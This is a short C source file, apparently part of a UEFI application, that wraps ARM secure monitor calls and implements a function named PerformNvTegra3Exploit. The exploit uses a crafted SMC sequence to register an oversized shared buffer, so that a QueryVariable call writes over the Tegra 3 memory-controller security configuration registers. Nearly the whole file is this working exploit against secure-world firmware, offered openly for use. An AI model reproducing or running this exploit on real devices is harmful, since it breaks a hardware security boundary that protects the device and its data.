// Smc.c: SMC and exploit handler
#include "Include/Application.h"

UINT32
ArmCallSmcHelper(UINT32 R0, UINT32 R1, UINT32 R2, UINT32 R3)
{
  ARM_SMC_ARGS ArmSmcArgs;

#if DEBUG
  Print(
      L"ArmCallSmcHelper: >>> {0x%08x, 0x%08x, 0x%08x, 0x%08x}\n", R0, R1, R2,
      R3);
#endif

  ArmSmcArgs.Arg0 = R0;
  ArmSmcArgs.Arg1 = R1;
  ArmSmcArgs.Arg2 = R2;
  ArmSmcArgs.Arg3 = R3;

  ArmCallSmc(&ArmSmcArgs);

#if DEBUG
  Print(
      L"ArmCallSmcHelper: <<< {0x%08x, 0x%08x, 0x%08x, 0x%08x}\n",
      ArmSmcArgs.Arg0, ArmSmcArgs.Arg1, ArmSmcArgs.Arg2, ArmSmcArgs.Arg3);
#endif

  return ArmSmcArgs.Arg0;
}

VOID PerformNvTegra3Exploit(VOID)
{
  UINT32 Ret = 0;
  // Get size of the buffers needed (discarded)
  Ret = ArmCallSmcHelper(0x03, 0x09, 0, 0);

  // Switch secure world handlers to runtime mode
  Ret = ArmCallSmcHelper(0x03, 0x05, 0, 0);

  // Register a new shared memory buffer at 0x4000_0000 (IRAM) with size
  // 0x6001_e0e0. The following algorithm is used to determine the end address
  // that the QueryVariable call will write over:
  //  response_area = (request_area + (area_slice >> 1));
  Ret = ArmCallSmcHelper(0x03, 0x06, 0x40000000, 0x6001e0e0);

  // QueryVariable, does a 32 byte memory copy over to 0x7000f070...f090.
  // (MC_SECURITY_CFG0, MC_SECURITY_CFG1 and reserved registers)
  gBS->SetMem((VOID *)0x40000000, 32, 0);
  Ret = ArmCallSmcHelper(0x03, 0x03, 0, 0);
}
